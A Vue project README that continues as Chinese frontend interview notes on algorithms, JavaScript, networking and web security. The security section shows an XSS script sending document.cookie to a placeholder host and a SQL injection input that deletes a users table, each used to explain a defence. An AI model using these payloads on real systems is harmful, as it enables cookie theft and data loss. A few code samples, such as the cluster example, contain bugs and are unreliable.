# mogujie

## Project setup
```
npm install
```

### Compiles and hot-reloads for development
```
npm run serve
```

### Compiles and minifies for production
```
npm run build
```

### Lints and fixes files
```
npm run lint
```

### Customize configuration
See [Configuration Reference](https://cli.vuejs.org/config/).

## 算法

> 数据结构决定上限，算法决定下限
>
> 有顺序必二分，循环嵌套双指针
>
> 尽量不要去转换数据结构，尤其是数组这种有序结构（1-10000对称数），尽量不要用内置高阶api，性能低

算法复杂度即程序执行时需要的计算量（时间复杂度）和内存空间（空间复杂度）

时间复杂度是数量级

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301282221646.png)

O(1)：一次就够

O(n)：和传输的数据量一样

O(n^2)：数据量的平方

O(logn)：数据量的对数

O(n*logn)：数据量 * 数据量的对数



### 将一个数组旋转k步

输入一个数组[1,2,3,4,5,6,7]，k=3，即旋转3步，输出[5,6,7,1,2,3,4]

```typescript
/**
 * 旋转数组 k 步 - 使用 pop 和 unshift
 * @param arr arr
 * @param k k
 * @returns arr
 */
export function rotate1(arr: number[], k: number): number[] {
    const length = arr.length
    if (!k || length === 0) return arr
    const step = Math.abs(k % length) // abs 取绝对值

    // O(n^2)
    for (let i = 0; i < step; i++) {
        const n = arr.pop()
        if (n != null) {
            arr.unshift(n) // 数组是一个有序结构，unshift 操作非常慢！！！ O(n)
        }
    }
    return arr
}

/**
 * 旋转数组 k 步 - 使用 concat
 * @param arr arr
 * @param k k
 */
 export function rotate2(arr: number[], k: number): number[] {
    const length = arr.length
    if (!k || length === 0) return arr
    const step = Math.abs(k % length) // abs 取绝对值

    // O(1)
    const part1 = arr.slice(-step) // O(1)
    const part2 = arr.slice(0, length - step)
    const part3 = part1.concat(part2)
    return part3
}
```

### 判断字符串是否括号匹配

一个字符串s可能包含{}()[]三种括号，判断s是否是括号匹配的，如(a{b}c)匹配，{a(b或{a(b}c)就不匹配

```typescript
/**
 * 判断左右括号是否匹配
 * @param left 左括号
 * @param right 右括号
 */
function isMatch(left: string, right: string): boolean {
    if (left === "{" && right === "}") return true;
    if (left === "[" && right === "]") return true;
    if (left === "(" && right === ")") return true;
    return false;
}

/**
 * 判断是否括号匹配
 * @param str str
 */
export function matchBracket(str: string): boolean {
    const length = str.length;
    if (length === 0) return true;

    const stack = [];

    const leftSymbols = "{[(";
    const rightSymbols = "}])";

    for (let i = 0; i < length; i++) {
        const s = str[i];

        if (leftSymbols.includes(s)) {
            // 左括号，压栈
            stack.push(s);
        } else if (rightSymbols.includes(s)) {
            // 右括号，判断栈顶（是否出栈）
            const top = stack[stack.length - 1];
            if (isMatch(top, s)) {
                stack.pop();
            } else {
                return false;
            }
        }
    }

    return stack.length === 0;
}

```

### 两个栈实现一个队列

```typescript
export class MyQueue {
    private stack1: number[] = []
    private stack2: number[] = []

    /**
     * 入队
     * @param n n
     */
    add(n: number) {
        this.stack1.push(n)
    }

    /**
     * 出队
     */
    delete(): number | null {
        let res

        const stack1 = this.stack1
        const stack2 = this.stack2

        // 将 stack1 所有元素移动到 stack2 中
        while(stack1.length) {
            const n = stack1.pop()
            if (n != null) {
                stack2.push(n)
            }
        }

        // stack2 pop
        res = stack2.pop()

        // 将 stack2 所有元素“还给”stack1
        while(stack2.length) {
            const n = stack2.pop()
            if (n != null) {
                stack1.push(n)
            }
        }

        return res || null
    }

    get length(): number {
        return this.stack1.length
    }
}
```

### JS反转单项链表

```typescript
export interface ILinkListNode {
    value: number
    next?: ILinkListNode
}

/**
 * 反转单向链表，并返回反转之后的 head node
 * @param listNode list head node
 */
export function reverseLinkList(listNode: ILinkListNode): ILinkListNode {
    // 定义三个指针
    let prevNode: ILinkListNode | undefined = undefined
    let curNode: ILinkListNode | undefined = undefined
    let nextNode: ILinkListNode | undefined = listNode

    // 以 nextNode 为主，遍历链表
    while(nextNode) {
        // 第一个元素，删掉 next ，防止循环引用
        if (curNode && !prevNode) {
            delete curNode.next
        }

        // 反转指针
        if (curNode && prevNode) {
            curNode.next = prevNode
        }

        // 整体向后移动指针
        prevNode = curNode
        curNode = nextNode
        nextNode = nextNode?.next
    }

    // 最后一个的补充：当 nextNode 空时，此时 curNode 尚未设置 next
    curNode!.next = prevNode

    return curNode!
}

/**
 * 根据数组创建单向链表
 * @param arr number arr
 */
export function createLinkList(arr: number[]): ILinkListNode {
    const length = arr.length
    if (length === 0) throw new Error('arr is empty')

    let curNode: ILinkListNode = {
        value: arr[length - 1]
    }
    if (length === 1) return curNode

    for (let i = length - 2; i >= 0; i--) {
        curNode = {
            value: arr[i],
            next: curNode
        }
    }

    return curNode
}
```

### 链表实现队列

```typescript
interface IListNode {
    value: number
    next: IListNode | null
}

export class MyQueue {
    private head: IListNode | null = null
    private tail: IListNode | null = null
    private len = 0

    /**
     * 入队，在 tail 位置
     * @param n number
     */
    add(n: number) {
        const newNode: IListNode = {
            value: n,
            next: null,
        }

        // 处理 head
        if (this.head == null) {
            this.head = newNode
        }

        // 处理 tail
        const tailNode = this.tail
        if (tailNode) {
            tailNode.next = newNode
        }
        this.tail = newNode

        // 记录长度
        this.len++
    }

    /**
     * 出队，在 head 位置
     */
    delete(): number | null {
        const headNode = this.head
        if (headNode == null) return null
        if (this.len <= 0) return null

        // 取值
        const value = headNode.value

        // 处理 head
        this.head = headNode.next

        // 记录长度
        this.len--

        return value
    }

    get length(): number {
        // length 要单独存储，不能遍历链表来获取（否则时间复杂度太高 O(n)）
        return this.len
    }
}
```

### 二分查找

```typescript
/**
 * 二分查找（循环）
 * @param arr arr
 * @param target target
 */
export function binarySearch1(arr: number[], target: number): number {
    const length = arr.length
    if (length === 0) return -1

    let startIndex = 0 // 开始位置
    let endIndex = length - 1 // 结束位置

    while (startIndex <= endIndex) {
        const midIndex = Math.floor((startIndex + endIndex) / 2)
        const midValue = arr[midIndex]
        if (target < midValue) {
            // 目标值较小，则继续在左侧查找
            endIndex = midIndex - 1
        } else if (target > midValue) {
            // 目标值较大，则继续在右侧查找
            startIndex = midIndex + 1
        } else {
            // 相等，返回
            return midIndex
        }
    }

    return -1
}

/**
 * 二分查找（递归）
 * @param arr arr
 * @param target target
 * @param startIndex start index
 * @param endIndex end index
 */
export function binarySearch2(arr: number[], target: number, startIndex?: number, endIndex?: number): number {
    const length = arr.length
    if (length === 0) return -1

    // 开始和结束的范围
    if (startIndex == null) startIndex = 0
    if (endIndex == null) endIndex = length - 1

    // 如果 start 和 end 相遇，则结束
    if (startIndex > endIndex) return -1

    // 中间位置
    const midIndex = Math.floor((startIndex + endIndex) / 2)
    const midValue = arr[midIndex]

    if (target < midValue) {
        // 目标值较小，则继续在左侧查找
        return binarySearch2(arr, target, startIndex, midIndex - 1)
    } else if (target > midValue) {
        // 目标值较大，则继续在右侧查找
        return binarySearch2(arr, target, midIndex + 1, endIndex)
    } else {
        // 相等，返回
        return midIndex
    }
}
```

### 两数之和

```typescript
/**
 * 寻找和为 n 的两个数（嵌套循环）
 * @param arr arr
 * @param n n
 */
export function findTowNumbers1(arr: number[], n: number): number[] {
    const res: number[] = []

    const length = arr.length
    if (length === 0) return res

    // O(n^2)
    for (let i = 0; i < length - 1; i++) {
        const n1 = arr[i]
        let flag = false // 是否得到了结果

        for (let j = i + 1; j < length; j++) {
            const n2 = arr[j]

            if (n1 + n2 === n) {
                res.push(n1)
                res.push(n2)
                flag = true
                break
            }
        }

        if (flag) break
    }

    return res
}

/**
 * 查找和为 n 的两个数（双指针）
 * @param arr arr
 * @param n n
 */
export function findTowNumbers2(arr: number[], n: number): number[] {
    const res: number[] = []

    const length = arr.length
    if (length === 0) return res

    let i = 0 // 头
    let j = length - 1 // 尾

    // O(n)
    while (i < j) {
        const n1 = arr[i]
        const n2 = arr[j]
        const sum = n1 + n2

        if (sum > n) {
            // sum 大于 n ，则 j 要向前移动
            j--
        } else if (sum < n) {
            // sum 小于 n ，则 i 要向后移动
            i++
        } else {
            // 相等
            res.push(n1)
            res.push(n2)
            break
        }
    }

    return res
}
```

### 求二叉搜索树的第K小值

二叉树是一棵树，每个节点最多只能有2个子节点，树节点的数据结构{value, left?, right?}

二叉搜索树：left包括其后代value<=root value，right包括其后代value>=root value，因为其特点，采用二分法中序遍历最优

```typescript
export interface ITreeNode {
    value: number;
    left: ITreeNode | null;
    right: ITreeNode | null;
}

const arr: number[] = [];

/**
 * 二叉树前序遍历
 * @param node tree node
 */
function preOrderTraverse(node: ITreeNode | null) {
    if (node == null) return;
    // console.log(node.value)
    arr.push(node.value);
    preOrderTraverse(node.left);
    preOrderTraverse(node.right);
}

/**
 * 二叉树中序遍历
 * @param node tree node
 */
function inOrderTraverse(node: ITreeNode | null) {
    if (node == null) return;
    inOrderTraverse(node.left);
    // console.log(node.value)
    arr.push(node.value);
    inOrderTraverse(node.right);
}

/**
 * 二叉树后序遍历
 * @param node tree node
 */
function postOrderTraverse(node: ITreeNode | null) {
    if (node == null) return;
    postOrderTraverse(node.left);
    postOrderTraverse(node.right);
    // console.log(node.value)
    arr.push(node.value);
}

/**
 * 寻找 BST 里的第 K 小值
 * @param node tree node
 * @param k 第几个值
 */
export function getKthValue(node: ITreeNode, k: number): number | null {
    inOrderTraverse(node);
    return arr[k - 1] || null;
}

const bst: ITreeNode = {
    value: 5,
    left: {
        value: 3,
        left: {
            value: 2,
            left: null,
            right: null,
        },
        right: {
            value: 4,
            left: null,
            right: null,
        },
    },
    right: {
        value: 7,
        left: {
            value: 6,
            left: null,
            right: null,
        },
        right: {
            value: 8,
            left: null,
            right: null,
        },
    },
};

console.log(getKthValue(bst, 3));
```

### 斐波那契数列

```typescript
/**
 * 斐波那契数列（循环）
 * @param n n
 */
export function fibonacci(n: number): number {
    if (n <= 0) return 0
    if (n === 1) return 1

    let n1 = 1 // 记录 n-1 的结果
    let n2 = 0 // 记录 n-2 的结果
    let res = 0

    for (let i = 2; i <= n; i++) {
        res = n1 + n2

        // 记录中间结果
        n2 = n1
        n1 = res
    }

    return res
}
```

### 动态规划

动态规划即把一个大问题拆分成多个小问题，逐级向下拆解

用递归的思路去分析问题，再改为循环来实现

算法三大思维：贪心，二分，动态规划

### 移动0到数组末尾

双指针：j指向第一个0，i指向j后的第一个非0，然后交换两个位置的值

```typescript
/**
 * 移动 0 到数组末尾（双指针）
 * @param arr number arr
 */
export function moveZero2(arr: number[]): void {
    const length = arr.length
    if (length === 0) return

    let i
    let j = -1 // 指向第一个 0

    for (i = 0; i < length; i++) {
        if (arr[i] === 0) {
            // 第一个 0
            if (j < 0) {
                j = i
            }
        }

        if (arr[i] !== 0 && j >= 0) {
            // 交换
            const n = arr[i]
            arr[i] = arr[j]
            arr[j] = n

            j++
        }
    }
}
```

### 统计字符串中连续最多的字符

```typescript
interface IRes {
    char: string
    length: number
}
/**
 * 求连续最多的字符和次数（双指针）
 * @param str str
 */
export function findContinuousChar2(str: string): IRes {
    const res: IRes = {
        char: '',
        length: 0
    }

    const length = str.length
    if (length === 0) return res

    let tempLength = 0 // 临时记录当前连续字符的长度
    let i = 0
    let j = 0

    // O(n)
    for (; i < length; i++) {
        if (str[i] === str[j]) {
            tempLength++
        }

        if (str[i] !== str[j] || i === length - 1) {
            // 不相等，或者 i 到了字符串的末尾
            if (tempLength > res.length) {
                res.char = str[j]
                res.length = tempLength
            }
            tempLength = 0 // reset

            if (i < length - 1) {
                j = i // 让 j “追上” i
                i-- // 细节
            }
        }
    }

    return res
 }
```

### 快速排序

固定思路：找出中间位置midValue，遍历数组，小于midValue放在left，否则放在right。继续递归，最后concat拼接返回

```typescript
/**
 * 快速排序（使用 slice）
 * @param arr number arr
 */
export function quickSort2(arr: number[]): number[] {
    const length = arr.length
    if (length === 0) return arr

    const midIndex = Math.floor(length / 2)
    const midValue = arr.slice(midIndex, midIndex + 1)[0]

    const left: number[] = []
    const right: number[] = []

    for (let i = 0; i < length; i++) {
        if (i !== midIndex) {
            const n = arr[i]
            if (n < midValue) {
                // 小于 midValue ，则放在 left
                left.push(n)
            } else {
                // 大于 midValue ，则放在 right
                right.push(n)
            }
        }
    }

    return quickSort2(left).concat(
        [midValue],
        quickSort2(right)
    )
}
```

### 求1-10000之间所有对称数

```typescript
/**
 * 查询 1-max 的所有对称数（数组反转）
 * @param max 最大值
 */
export function findPalindromeNumbers1(max: number): number[] {
    const res: number[] = []
    if (max <= 0) return res

    for (let i = 1; i <= max; i++) {
        // 转换为字符串，转换为数组，再反转，比较
        const s = i.toString()
        if (s === s.split('').reverse().join('')) {
            res.push(i)
        }
    }

    return res
}

/**
 * 查询 1-max 的所有对称数（字符串前后比较）
 * @param max 最大值
 */
export function findPalindromeNumbers2(max: number): number[] {
    const res: number[] = []
    if (max <= 0) return res

    for (let i = 1; i <= max; i++) {
        const s = i.toString()
        const length = s.length

        // 字符串头尾比较
        let flag = true
        let startIndex = 0 // 字符串开始
        let endIndex = length - 1 // 字符串结束
        while (startIndex < endIndex) {
            if (s[startIndex] !== s[endIndex]) {
                flag = false
                break
            } else {
                // 继续比较
                startIndex++
                endIndex--
            }
        }

        if (flag) res.push(i)
    }

    return res
}

/**
 * 查询 1-max 的所有对称数（翻转数字）
 * @param max 最大值
 */
export function findPalindromeNumbers3(max: number): number[] {
    const res: number[] = []
    if (max <= 0) return res

    for (let i = 1; i <= max; i++) {
        let n = i
        let rev = 0 // 存储翻转数

        // 生成翻转数
        while (n > 0) {
            rev = rev * 10 + n % 10
            n = Math.floor(n / 10)
        }

        if (i === rev) res.push(i)
    }

    return res
}

// 性能测试
console.time('findPalindromeNumbers1')
findPalindromeNumbers1(100 * 10000)
console.timeEnd('findPalindromeNumbers1') // 408ms

console.time('findPalindromeNumbers2')
findPalindromeNumbers2(100 * 10000)
console.timeEnd('findPalindromeNumbers2') // 53ms

console.time('findPalindromeNumbers3')
findPalindromeNumbers3(100 * 10000)
console.timeEnd('findPalindromeNumbers3') // 42ms
```

### 高效字符串前缀匹配

字典有几十万个词，根据前缀将其区分，比如a分一类，b分一类，然后依次往下分

### 数字千分位格式化

```typescript
/**
 * 千分位格式化（使用数组）
 * @param n number
 */
export function format1(n: number): string {
    n = Math.floor(n) // 只考虑整数

    const s = n.toString()
    const arr = s.split('').reverse()
    return arr.reduce((prev, val, index) => {
        if (index % 3 === 0) {
            if (prev) {
                return val + ',' + prev
            } else {
                return val
            }
        } else {
            return val + prev
        }
    }, '')
}

/**
 * 数字千分位格式化（字符串分析）
 * @param n number
 */
export function format2(n: number): string {
    n = Math.floor(n) // 只考虑整数

    let res = ''
    const s = n.toString()
    const length = s.length

    for (let i = length - 1; i >= 0; i--) {
        const j = length - i
        if (j % 3 === 0) {
            if (i === 0) {
                res = s[i] + res
            } else {
                res = ',' + s[i] + res
            }
        } else {
            res = s[i] + res
        }
    }

    return res
}
```

## 基础

### ajax、fetch和axios三者区别

三者都用于网络请求，但是维度不同

- ajax是一种技术统称
- fetch是一个具体的api，和XMLHttpRequest是一个级别的，支持promise
- axios是一个第三方库，内部用XMLHttpRequest和Fetch来实现

### 节流和防抖

防抖：限制执行次数

```js
function debounce(fn, delay = 200){
    let timer = 0
    
    return function() {
        if (timer) clearTimeout(timer)
        
        timer = setTimeout(() => {
            fn.apply(this, arguments)
            timer = 0
        }, delay)
    }
}
```

节流：限制执行频率

```js
function throttle(fn, delay = 100) {
	let timer = 0
    return function () {
        if (timer) return
        timer = setTimeout(() => {
            fn.apply(this, arguments)
            timer = 0
        }, delay)
    }
}
```

### px % em rem vw/vh的区别

px是基本单位，绝对单位

%相对于父元素的宽高比例

em相对于当前元素的font-size

rem相对于根节点的font-size

vw屏幕宽度的1%

vh屏幕高度的1%

vmin取vh和vw的最小值，vmax取最大值

### 箭头函数

箭头函数缺点

- 没有arguments
- 没有this

什么时候不适用用箭头函数：

- 对象中的方法（因为这些方法可能通过this访问对象某个属性）
- 原型上的方法（没法通过this获取原型对象）
- 构造函数（不能通过this获取新创建的对象）
- 动态上下文中的回调函数（如绑定事件，事件函数通过this获取元素引用)

### TCP三次握手和四次挥手

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301302205856.png)

### for...in和for...of有什么区别

for...in得到key，for...of得到value

遍历数组：for in和for of都可以

遍历对象：for in可以，for of不可以

遍历MapSet：for of可以，for in不可以

遍历generator：for of可以，for in不可以

原因是for in用于可枚举数据(enumerable为true)，for of用于可迭代属性(有Symbol.iterator属性)



for-await-of用来遍历多个promise，必须在async函数中使用，作用和promise.all一样

### offsetHeight、scrollHeight和clientHeight有什么区别

offsetHeight/offsetWidth: border+padding+content

scrollHeight/scrollWidth：padding+实际内容尺寸

clientHeight/clientWidth：padding+content

### HTMLCollection和NodeList区别

HTMLCollection是Element的集合

NodeList是所有Node的集合

### JS严格模式特点

- 全局变量必须声明
- 创建eval作用域（非严格模式下eval中的代码是全局作用域）
- 禁止用with
- 禁止this指向window
- 函数参数不能重复声明

## 知识深度

### 垃圾回收

以前是引用计数（循环引用有问题），现在是标记清除



闭包是内存泄漏吗？答：不算。内存泄漏是非预期的，闭包的结果是符合预期的

### 如何检测内存泄漏？

在浏览器控制台中的performance中选择memory，点击清除和垃圾回收后开启检测，最上方的heap就代表js的堆内存。如果heap曲线一直升高则存在内存泄漏



内存泄漏场景：

- 被全局变量、函数引用，组件销毁时未清除

  ```vue
  <script>
      export default{
          data() {
  			return {
                  arr: [10,20,30]
              }
      	},
          mounted() {
              window.arr = this.arr
              window.printArr = () => {
                  console.log(this.arr)
              }
          },
          beforeUnmount() {
              window.arr = null
              window.printArr = null
          }
      }
  </script>
  ```

- 被全局事件、定时器引用，组件销毁时未清除

  ```vue
  <script>
      export default{
          data() {
  			return {
                  arr: [10,20,30],
                  intervalId: 0
              }
      	},
          mounted() {
              setInterval(() => {
                  console.log(this.arr)
              }, 100)
          },
          beforeUnmount() {
              if (this.intervalId) {
                  clearInterval(this.intervalId)
              }
          }
      }
  </script>
  ```
- 被自定义事件引用，组件销毁时未清除

### 浏览器和nodejs的事件循环

js是单线程的，浏览器执行js和dom共用一个线程（执行互斥）。

异步分为宏任务（setTimeout、setIntervel、网络请求）和微任务（promise、async await、MutationObserver）

微任务实在下一轮DOM渲染之前执行，宏任务在之后执行

```js
const p = document.createElement('p')
p.innerHTML = 'new paragraph'
document.body.appendChild(p)

console.log(start)
setTimeout(() => {
	const list = document.getElementsByTagName('p')
	console.log('length on timeout----', list.length)
	alert('阻塞 timeout')
})
Promise.resolve().then(() => {
	const list = document.getElementsByTagName('p')
	console.log('length on promise.then----', list.length)
	alert('阻塞 promise')
})
console.log('end')

// start
// end
// length on promise.then---- 1 此时p未插入到页面中
// length on timeout---- 1 此时p插入到页面中
```

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301311338283.png)

浏览器先执行同步代码，遇到异步的api先放到异步任务队列（不是立马就放，ajax或定时器到时间触发点之后才放到任务队列），等到同步运行结束，运行微任务，渲染dom，执行宏任务。然后eventloop再去监听是否有新的异步任务加入到任务队列，执行下一轮循环



NodeJS异步也分宏任务和微任务，然是他的宏任务和微任务分不同类型，有不同优先级

宏任务优先级（每个优先级的宏任务开始之前都会去执行当前的微任务）：

1. Timers - setTimeout setInterval
2. I/O callbacks - 网络、流的回调
3. Idle、prepare - 闲置状态
4. Poll轮询 - 执行poll中的I/O队列
5. Check检查 - 存储setImmediate回调
6. Close callbacks - 关闭回调，如socket.on('close')

微任务优先级：

1. process.nextTick
2. promise、async/await

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301311356475.png)

### 虚拟DOM真的快吗？

数据驱动视图：1.data变化；2.vnode diff；3.变化的部分更新DOM

虚拟DOM并不快，js直接操作DOM才是最快的。因为在更新视图之前要经过diff算法分析出vdom变化的部分。

### for和forEach哪个快

for快。因为forEach每执行一步就要创建一个函数。

### nodejs如何开启多进程，进程如何通讯

进程process：操作系统进行资源分配和调度的最小单位，有独立内存空间

线程thread：操作系统进行运算调度的最小单位，共享进程内存空间

**一个process可有多个thread**

js是单线程的，但是可以开启多个进程执行，如webworker



![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301311830596.png)



为什么需要多进程？多核cpu更适合处理多进程；内存较大，单进程有内存上限，多进程才能发挥作用



node通过fork和cluster开启多进程

```js
// fork开启多进程
const http = require('http')
const fork = require('child_process').fork

const server = http.createServer((req, res) => {
	if(req.url === '/get-sum') {
		console.info('主进程 id', process.pid)
		
		// 开启子进程
		const computeProcess = fork('./computed.js')
        computeProcess.send('开始计算')
        computeProcess.on('message', data => {
            console.log('主进程接收到的信息：', data)
            res.end('sum is' + data)
        })
        computeProcess.on('close', () => {
            console.info('子进程因报错而退出')
            computeProcess.kill()
            res.end('error')
        })
	}
})
server.listen(3000, () => {
	console.info('localhost:3000')
})

// computed.js
function getSum() {
    let sum = 0
    for(let i = 0; i < 10000; i++) {
        sum += i
    }
    return sum
}
// 子进程通过process.on监听接收到的信息
process.on('message', data => {
    console.log('子进程 id', process.pid)
    console.log('子进程接收到的信息：', data)
    const sum = getSum()
    // 子进程通过process.send发送信息
    process.send(sum)
})
```

```js
const http = require('http')
const cpuCoreLength = require('os').cpus().length
const fork = require('cluster')

if (cluster.isMaster) { // 是否是主进程
    for (let i = 0; i < cpuCoreLength; i++) {
        cluster.fork() // 开启子进程
    }
    
    cluster.on('exit', () => {
        console.log('子进程退出')
        cluster.fork() // 进程守护
    })
} else {
    // 子进程
    // 在多个子进程中开启server会不会网络冲突？不会!多个子进程会共享一个TCP连接，提供一份网络服务
    const server = createServer((req, res) => {
        res.writeHead(200)
        res.end('done')
    })
    server.listen(3000)
}
```

### JS Bridge原理

js无法调用原生app的api，需要特定的格式来调用，这些格式就叫JS Bridge

JS Bridge常见实现方式

- 注册全局API
- URL  Scheme

### requestIdleCallback和requestAnimationFrame有什么区别

requestIdleCalback是React fiber使用的一种将组件树转换为链表，可分段渲染。渲染时可暂停，去执行其他高优先级任务，空闲时再继续渲染，requestIdleCallback就是判断是否空闲的



**两者都是宏任务，且requestAnimationFrame永远都在requestIdleCallback之前执行**



区别：

requestAnimationFrame：每次渲染完都会执行，高优

requestIdleCallback：空闲时才执行，低优

### Vue Router的MemeryHistory是什么

Vue Router的三种模式：

- hash：路由变化是'#/about'这种形式的，是通过监听location.hash来实现的
- webHistory：路由变化是'/about'这种形式的，是通过history.pushState()和window.popState()来实现的
- MemeryHistory（v4之前叫abstract history）：url上没有任何变化，并且前进后退也不可用

### Vue2 Vue3 React 的diff算法的区别

diff的优化：

- 只比较同一层级，不跨级比较
- tag不同则删掉重建
- 子节点通过key区分

React：仅右移

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301312000966.png)

Vue2：双端比较

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301312001100.png)



vue3：最长递增子序列

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301312005294.png)

vue react为何循环时必须用key？

vdom diff算法会根据key来判断元素是否删除。key匹配则只移动位置，key不匹配则要删除重建。

## 知识广度

### 移动端h5点击有300ms延迟，如何解决？

早期手机屏幕比较小和适配不佳，所以需要双击来放大屏幕。在第一次点击后有300ms的时间来等待第二次点击，如果300ms内第二次点击则为双击来缩小放大。



解决方法1：FastClick库

```js
window.addEventListener('load', function() {
	FastClick.attach(document.body)
})
```

FastClick库原理：

1. 监听touchend事件（touchstart和touchend事件优于click触发） 
2. 把默认的click事件（300ms之后触发）禁止掉



解决方法2：<meta name="viewport" content="width=device-width">

### token和cookie有什么区别

cookie：

- http无状态的，每次请求都要带cookie，以帮助识别身份
- 服务端也可以向客户端set-cookie
- 默认有跨域限制：不可跨域共享（同一页面，一个iframe跨域）、传递（withCredentials解决）cookie

cookie和session：

- cookie用于登录验证，存储用户标识（如userId)
- session在服务端，存储用于详细i信息，和cookie信息一一对应

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301312242971.png)

token和cookie：

- cookie是http规范，会自动传，token是自定义传递
- cookie会默认被浏览器存储，而token需要自己存储
- token默认没有跨域限制

### HTTP和UDP协议有什么区别

- http协议在应用层
- TCP UDP协议在传输层

### HTTP协议1.0 1.1 2.0有什么区别

1.0只实现了get和post方法

1.1

- 增加了缓存策略cache-control e-tag等
- 支持长连接connection：keep-alive，一次连接多次请求
- 断点续传，状态码206
- 支持新方法PUT、DELETE等

2.0

- 可压缩header，减少体积
- 多路复用，一次TCP连接可以多个HTTP并行请求
- 服务端推送

### 什么是https中间人攻击，如何解决？

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202301312316421.png)

中间人攻击实在服务器向客户端发送公钥的时候劫持，换成自己的公钥。客户端用这个公钥生成的key，黑客再用自己的私钥解密。

解决方式：使用正规厂商的CA证书，慎用免费

### prefetch和dns-prefetch有什么区别

preload：资源在当前页面使用，优先加载

prefetch：资源在未来页面使用，空闲时加载

```html
<head>
    <link rel="preload" href="style.css" as="style">
    <link rel="preload" href="main.js" as="script">
    
    <link rel="prefetch" href="other.js" as="script">
    
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <script src="main.js" defer></script>
</body>
```



dns-prefetch：dns预解析

preconnect：dns预连接（TCP预连接）

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202302010011746.png)

```html
<link rel="dns-prefetch" href="https://fonts/gstatic.com">
<link ref="preconnect" href="https://fonts.gstatic.com">
```

### 前端有哪些攻击手段，该如何预防？

XSS（Cross Site Script跨站脚本攻击）：黑客将js代码插入到网页内容中，渲染时执行js代码。预防：替换特殊字符

**Vue和react的插值默认规避XSS攻击，除非用v-html或dangerouslySetInnerHTML**

```html
<div id="container">
	<p>
        <!--p标签中的123123是接口返回的数据，黑客在这基础上新增了一段js脚本，img可跨域，这样就能收集到所有用户的cookie了-->
        123123
        <script>
        	var img = document.createElement('img')
            img.src="https://xxx.com/api/xxx?cookie="+document.cookie
        </script>
    </p>
</div>
```

```js
// 解决方式：替换特殊字符
const str = `
		123123
        <script>
        	var img = document.createElement('img')
            img.src="https://xxx.com/api/xxx?cookie="+document.cookie
        </script>
`
const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
```

CSRF（Cross Site Request Forgery跨站攻击伪造）：黑客诱导用户去访问另一个网站的接口，伪造请求。预防：严格的跨域限制（验证referrer，为cookie设置SameSite）+验证码机制



点击劫持：诱导界面上蒙一个透明的iframe，诱导用户点击。预防：让iframe不能跨域加载

```js
if(top.location.hostname !== self.location.hostname){
	alert('您正在访问不安全的页面，即将跳转到安全页面！')
	top.location.href=self.location.href
}
```

DDoS（Distribute denial-of-service分布式拒绝服务）：分布式的、大规模的流量访问，使服务器瘫痪。预防：软件曾不好做，需硬件防护（如阿里云WAF）

SQL注入：黑客提交内容时写入SQL语句，破坏数据库。预防：处理输入的内容，替换特殊字符

```
如用户名zhangsan 密码123

正常查询sql select * from users where username='zhangsan' and pwd='123'

黑客将提交用户名为`';delete from users; --`

这样查询sql就成为 select * from users where username='';delete from users; --' and pwd='123'
这样成了三个语句
```

### websocket和http有什么区别

websocket

- 支持端对端通讯
- 用于：消息通知，直播间讨论区，聊天室，协同编辑

websocket连接过程

- 先发起一个http请求
- 成功之后再升级到websocket协议，再通讯

websocket和http区别：

- 协议名不同，websocket是ws://
- websocket没有跨域限制

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202302010052005.png)

### 从输入URL到网页展示完整过程



步骤：

- 网络请求
  - DNS查询（得到IP），建立TCP连接（三次握手）
  - 浏览器发起HTTP请求
  - 收到响应，得到HTML源码
- 解析
  - HTML构建DOM树
  - CSS构建CSSOM树
  - 两者合并，形成render tree
- 渲染
  - 计算各个DOM的尺寸、定位，最后绘制到页面
  - 遇到js可能会执行（defer、async）
  - 异步css、图片加载，可能会触发重新渲染

![](https://raw.githubusercontent.com/AvalonZzz/images/master/imgs/202302010132367.png)

重绘和重排有什么区别？

重绘：元素外观改变，如颜色、背景色，但元素的尺寸定位不变，不会影响其他元素的位置。

重排：重新计算元素尺寸和布局，可能会影响其他元素的位置。



减少重排的方法：1.集中修改样式或直接切换css class；2.修改之前先设置display:none，脱离文档流；3.使用BFC特性，不影响其他元素位置；4.频繁触发（resize scroll）使用节流和防抖；5.使用createDocumentFragment批量操作DOM；5.优化动画，使用CSS3和requestAnimationFrame

### 如何实现网页多Tab页通讯

1. 使用websocket
2. 通过localStorage
3. SharedWorker

### 网页和iframe如何通讯

```html
<body>
    <p>
        index page
        <button id="btn1">
            发送消息
        </button>
    </p>
    <iframe id="frame1" src="./child.html">
        
    </iframe>
    <script>
    	const btn1 = document.getElementById('btn1')
        btn1.addEventListener('click', () => {
            console.info('index clicked')
            window.iframe1.contentWindow.postMessage('hello', '*') // 第二个参数是限制跨域
        })
        window.addEventListener('message', event => {
            console.info('origin', event.origin) // 来源的域名
            console.info('index received', event.data) 
        })
    </script>
</body>
```

```html
<body>
    <p>
        child page
        <button id="btn1">
            发送消息
        </button>
    </p>
    <script>
    	const btn1 = document.getElementById('btn1')
        btn1.addEventListener('click', () => {
            console.info('child clicked')
            window.parent.postMessage('world', '*')
        })
        window.addEventListener('message', event => {
            console.info('origin', event.origin)
            console.info(event.data)
        })
    </script>
</body>
```

### vite为什么会这么快?

webpack在开发环境下，会抓取并构建整个应用，所以在项目越来越大时，构建也越来越慢

 vite不会一开始就构建整个应用，而是将应用中的模块区分成依赖和源码（项目代码），对于源码部分会根据路由来拆分代码模块，只会去构建一开始就必要的内容。

同时vite以原生ESM的方式为浏览器提供源码，让浏览器接管了打包的部分工作。（早期的vite不兼容commonjs和UMD，后期提供了依赖预构建的功能，会先将commonjs和UMD发布的依赖项转为ESM后，再重新进行编译)

### vue2和vue3对比

vue2缺陷：

- vue2代码复用困难，mixin容易出现命名冲突，且无法解决逻辑复用，vue3用hooks代替
- vue2对ts支持不足
- vue2内部实现过度依赖this，导致treeshaking无法进行

